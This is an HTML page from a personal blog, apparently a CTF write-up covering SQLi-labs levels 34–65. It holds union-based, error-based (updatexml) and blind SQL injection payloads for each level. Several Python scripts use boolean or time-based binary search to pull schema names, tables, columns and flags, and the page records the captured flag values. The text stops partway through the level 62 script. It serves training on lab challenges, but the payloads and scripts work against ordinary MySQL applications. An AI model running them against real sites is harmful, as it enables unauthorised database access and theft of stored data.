@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="刷题记录">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQLLABS 34-65">
+<meta property="og:url" content="http://example.com/2021/07/20/SQLILABS%2034-65/index.html">
+<meta property="og:site_name" content="Stary的个人博客">
+<meta property="og:description" content="刷题记录">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-11-14T07:41:08.637Z">
+<meta property="article:author" content="Stary">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://example.com/2021/07/20/SQLILABS%2034-65/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>SQLLABS 34-65 | Stary的个人博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Stary的个人博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">保持热情</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/20/SQLILABS%2034-65/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/D6C0CCF9F70347CF46810729EAC3C281.png">
+      <meta itemprop="name" content="Stary">
+      <meta itemprop="description" content="保持热情">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Stary的个人博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQLLABS 34-65
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-07-20 00:00:00" itemprop="dateCreated datePublished" datetime="2021-07-20T00:00:00+08:00">2021-07-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-11-14 15:41:08" itemprop="dateModified" datetime="2021-11-14T15:41:08+08:00">2021-11-14</time>
+              </span>
+
+          
+            <div class="post-description">刷题记录</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="SQL1ILABS-34-65"><a href="#SQL1ILABS-34-65" class="headerlink" title="SQL1ILABS 34-65"></a>SQL1ILABS 34-65</h1><h2 id="level-34"><a href="#level-34" class="headerlink" title="level 34"></a>level 34</h2><p>   十六进制代替 “ “里的东西</p>
+<p>1 �’union select 1,group_concat(schema_name) from information_schema.schemata #<br>1 �’union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x63746673686f77 #</p>
+<h2 id="level-35"><a href="#level-35" class="headerlink" title="level 35"></a>level 35</h2><p>有点直接。。。数字型注入？？？<br>?id=-1 union select 1,2,flag4s from ctfshow.flags%23</p>
+<h2 id="level-36"><a href="#level-36" class="headerlink" title="level 36"></a>level 36</h2><p>emmm<br>?id=-1�’union select 1,2,flag4s from ctfshow.flags%23</p>
+<h2 id="level-37"><a href="#level-37" class="headerlink" title="level 37"></a>level 37</h2><p>emmm<br>-1�’union select 1,2,flag4s from ctfshow.flags#</p>
+<h2 id="level-38"><a href="#level-38" class="headerlink" title="level 38"></a>level 38</h2><p>emmm<br>-1�’union select 1,flag4s from ctfshow.flags#</p>
+<h2 id="level-39"><a href="#level-39" class="headerlink" title="level 39"></a>level 39</h2><p>emmm<br>?id=-1 union select% 1,2,flag4s from ctfshow.flags%23</p>
+<h2 id="level-40"><a href="#level-40" class="headerlink" title="level 40"></a>level 40</h2><p>盲注跑脚本就是了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://591c712f-cd11-4547-94e0-27df596874e3.challenge.ctf.show:8080/&quot;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment">#?id=100&quot;||if(ascii(substr((seLeCt(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;9999,1,0)||&quot;0</span></span><br><span class="line">        <span class="comment"># payload=&quot;?id=100&#x27;)||if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;?id=100&#x27;)||if(ascii(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=&#x27;ctfshow&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)||(&#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;?id=100&#x27;)||if(ascii(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)=&#x27;flags&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,1,0)||(&#x27;0&quot;.format(i,mid)</span></span><br><span class="line">        payload=<span class="string">&quot;?id=1&#x27;) and if(ascii(substr((seLect(flag4s)from(ctfshow.flags)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)%23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line"></span><br><span class="line">        r=requests.get(url+payload)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Your Username is : Dumb&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head=mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail=mid</span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p> 中间没改，要用的话自己改改</p>
+<h2 id="level-41"><a href="#level-41" class="headerlink" title="level 41"></a>level 41</h2><p>上面脚本 里面的 ‘) 去掉就行’</p>
+<h2 id="level-42"><a href="#level-42" class="headerlink" title="level 42"></a>level 42</h2><p>密码处<br>-1’ union select 1,2,3#<br>-1’ union select 1,flag4s,3 from ctfshow.flags#</p>
+<h2 id="level-43"><a href="#level-43" class="headerlink" title="level 43"></a>level 43</h2><p>-1’)  union select 1,2,3 #<br>-1’) union select 1,flag4s,3 from ctfshow.flags#</p>
+<h2 id="level-44"><a href="#level-44" class="headerlink" title="level 44"></a>level 44</h2><p>admin’ or if(ascii(substr(database(),1,1))&gt;1,sleep(3),0) #<br>时间盲注。。脚本改一改</p>
+<h2 id="level-45"><a href="#level-45" class="headerlink" title="level 45"></a>level 45</h2><p>admin’) or 1=1 #<br>admin’) or if(ascii(substr(database(),1,1))&gt;1,sleep(3),0) #<br>时间盲注改一改</p>
+<h2 id="level-46"><a href="#level-46" class="headerlink" title="level 46"></a>level 46</h2><p>报错注入<br>1 or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#<br>1 or updatexml(1,concat(0x26,(select right(group_concat(schema_name),30) from information_schema.schemata),0x26),1)#<br>1 or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’ctfshow’),0x26),1)#<br>1 or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’flags’),0x26),1)#<br>1 or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)#<br>1 or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)#<br>ctfshow{04b1482e-203c-44f1-8bb6-df5b27801821}</p>
+<h2 id="level-47"><a href="#level-47" class="headerlink" title="level 47"></a>level 47</h2><p>1’or updatexml(1,concat(0x26,(select left(group_concat(schema_name),30) from information_schema.schemata),0x26),1)%23<br>..<br>..<br>..<br>..<br>1’ or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23<br>1’ or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23</p>
+<p>ctfshow{749b597e-5a51-495b-b92c-1a3accd21bc0}</p>
+<p>?sort=1’or if(ascii(substr(database(),1,1))&gt;1,sleep(0.5),0) %23</p>
+<h2 id="level-48"><a href="#level-48" class="headerlink" title="level 48"></a>level 48</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://ee9f5ee9-1368-4d89-a875-1a44cfdf308e.challenge.ctf.show:8080/?sort=1 and &quot;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,sleep(0.5),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctftraining&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr((select flag4s from ctfshow.flags),&#123;&#125;,1))&gt;&#123;&#125;,sleep(0.5),0) %23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># start_time=time.time()</span></span><br><span class="line">        r=requests.get(url+payload)</span><br><span class="line">        print(url+payload)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload,timeout=<span class="number">0.4</span>)</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+<p>ctfshow{6d997ae2-953d-4117-8563-e426fb32bc65}</p>
+<h2 id="level-49"><a href="#level-49" class="headerlink" title="level 49"></a>level 49</h2><p>时间盲注</p>
+<p>1’ and if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;2,sleep(0.5),0) %23</p>
+<p>贴个脚本，自己改</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://583bbd02-c708-41eb-86ab-f792729f9843.node4.buuoj.cn/Less-49/?sort=1&#x27; and &quot;</span></span><br><span class="line"></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">    head=<span class="number">32</span></span><br><span class="line">    tail=<span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">        payload=<span class="string">&quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,sleep(0.5),0) %23&quot;</span>.<span class="built_in">format</span>(i,mid)</span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=&#x27;ctftraining&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;flag&#x27;),&#123;&#125;,1))&gt;&#123;&#125;,sleep(1),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># payload=&quot;if(ascii(substr((select flag4s from ctfshow.flags),&#123;&#125;,1))&gt;&#123;&#125;,sleep(0.5),0) %23&quot;.format(i,mid)</span></span><br><span class="line">        <span class="comment"># print(url+payload)</span></span><br><span class="line">        <span class="comment"># start_time=time.time()</span></span><br><span class="line">        r=requests.get(url+payload)</span><br><span class="line">        print(url+payload)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.get(url+payload,timeout=<span class="number">0.4</span>)</span><br><span class="line">            tail = mid</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">        result+=<span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure>
+
+
+
+
+<h2 id="level-50"><a href="#level-50" class="headerlink" title="level 50"></a>level 50</h2><p>1 or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23<br>1 or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23</p>
+<p>ctfshow{0f3c691a-ba65-4f5b-ad46-bc0e58100b9e}</p>
+<h2 id="level-51"><a href="#level-51" class="headerlink" title="level 51"></a>level 51</h2><p>1’or updatexml(1,concat(0x26,(select right(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23<br>1’or updatexml(1,concat(0x26,(select left(group_concat(flag4s),30) from ctfshow.flags),0x26),1)%23<br>ctfshow{23972c5c-3569-4115-8572-0f754336659a}</p>
+<h2 id="level-52"><a href="#level-52" class="headerlink" title="level 52"></a>level 52</h2><p>时间盲注<br>?sort=1 and if(ascii(substr((seleCt(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;2,sleep(5),0) %23<br>49那个脚本改一改</p>
+<h2 id="level-53"><a href="#level-53" class="headerlink" title="level 53"></a>level 53</h2><p>时间盲注脚本跑一跑<br>?sort=1’ and if(ascii(substr(database(),1,1))&gt;114,sleep(0.5),0) %23</p>
+<h2 id="level-54"><a href="#level-54" class="headerlink" title="level 54"></a>level 54</h2><p>网上没环境了<br>用docker搭了个环境自己做<br>10次机会<br>先写好语句<br>id=-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata %23<br>id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’ %23<br>N4QU4VGMDT<br>id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’N4QU4VGMDT’ %23<br>secret_XA5R<br>?id=-1’union select 1,group_concat(secret_XA5R),3 from challenges.N4QU4VGMDT %23</p>
+<h2 id="level-55"><a href="#level-55" class="headerlink" title="level 55"></a>level 55</h2><p>?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23<br>?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’RW5TWVFDYU’%23<br>?id=-1) union select 1,group_concat(secret_O1KM),3 from challenges.RW5TWVFDYU%23</p>
+<h2 id="level-56"><a href="#level-56" class="headerlink" title="level 56"></a>level 56</h2><p>?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23<br>MMFDGR6C60<br>?id=-1’) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’MMFDGR6C60’%23<br>secret_ZGCM<br>?id=-1’) union select 1,group_concat(secret_ZGCM),3 from challenges.MMFDGR6C60%23</p>
+<h2 id="level-57"><a href="#level-57" class="headerlink" title="level 57"></a>level 57</h2><p>?id=-1” union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’challenges’%23<br>UCNSDJBA2P<br>?id=-1” union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’UCNSDJBA2P’%23<br>secret_7COO<br>?id=-1” union select 1,group_concat(secret_7COO),3 from challenges.UCNSDJBA2P%23</p>
+<h2 id="level-58"><a href="#level-58" class="headerlink" title="level 58"></a>level 58</h2><p>没有回显,有报错信息<br>报错注入<br>1’ or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23<br>WMYP9VS7T2<br>1’ or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’WMYP9VS7T2’),0x26),1)%23<br>secret_YKLV<br>1’ or updatexml(1,concat(0x26,(select right(group_concat(secret_YKLV),30) from challenges.WMYP9VS7T2),0x26),1)%23<br>BzE8UovoHobfXoFK5rflIeMo</p>
+<h2 id="level-59"><a href="#level-59" class="headerlink" title="level 59"></a>level 59</h2><p>?id=1 or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23<br>WZBWCK0O8M<br>?id=1  or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’WZBWCK0O8M’),0x26),1)%23<br>secret_CNZ0<br>?id=1  or updatexml(1,concat(0x26,(select right(group_concat(secret_CNZ0),30) from challenges.WZBWCK0O8M),0x26),1)%23<br>JeF0NQQk0TXsVJM6MzoPbtiL</p>
+<h2 id="level-60"><a href="#level-60" class="headerlink" title="level 60"></a>level 60</h2><p>?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23<br>IYK33M1WVE<br>?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’IYK33M1WVE’),0x26),1)%23<br>secret_WL6G<br>?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(secret_WL6G),30) from challenges.IYK33M1WVE),0x26),1)%23<br>f3Vhf9q9mInCQoAqyOXGCLcy</p>
+<h2 id="level-61"><a href="#level-61" class="headerlink" title="level 61"></a>level 61</h2><p>?id=1’))or updatexml(1,concat(0x26,(select right(group_concat(table_name),30) from information_schema.tables where table_schema=’challenges’),0x26),1)%23<br>UEEUBQKDFE<br>?id=1’))or updatexml(1,concat(0x26,(select right(group_concat(column_name),30) from information_schema.columns where table_name=’UEEUBQKDFE’),0x26),1)%23<br>secret_RMS1<br>?id=1”)or updatexml(1,concat(0x26,(select right(group_concat(secret_RMS1),30) from challenges.UEEUBQKDFE),0x26),1)%23<br>KnCHCTocAwPG2sToN2wUczxu</p>
+<h2 id="level-62"><a href="#level-62" class="headerlink" title="level 62"></a>level 62</h2><p>上脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&quot;http://100.100.1.20/Less-62/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quick</span>(<span class="params">load</span>):</span></span><br><span class="line">    result=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">        head=<span class="number">32</span></span><br><span class="line">        tail=<span class="number">127</span></span><br><span class="line">        <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">            mid=(head+tail)&gt;&gt;<span class="number">1</span></span><br><span class="line">            payload = load % (i,mid)</span><br><span class="line">            <span class="comment"># print(url+payload)</span></span><br><span class="line">            r=requests.get(url+payload)</span><br><span class="line">            <span class="comment"># print(r.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name : Angelina&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                head=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tail=mid</span><br><span class="line">        <span class="keyword">if</span> head !=<span class="number">32</span>:</span><br><span class="line">            result+=<span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        print(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">table_name = quick(</span><br><span class="line">    <span class="string">&quot;?id=1&#x27;)and if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;challenges&#x27;),%s,1))&gt;%s,1,0)%%23&quot;</span></span><br><span class="line">)</span><br><span class="line">print(<span class="string">&quot;table_name:&quot;</span>+table_name)</span><br><span class="line"></span><br><span class="line">column_name = quick(</span><br><span class="line">    <span class="string">&quot;?id=1&#x27;)and if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;&quot;</span>+table_name+<span class="string">&quot;&#x27;),%s,1))&gt;%s,1,0)%%23&quot;</span></span><br><span class="line">)</span><br><span class="line">column_name=column_name[<span class="number">10</span>:<span class="number">21</span>]</span><br><span class="line">print(<span class="string">&quot;column_name:&quot;</span>+column_name)</span><br><span class="line"></span><br><span class="line">secret_key=quick(</span><br><span class="line">    <span class="string">&quot;?id=1&#x27;)and 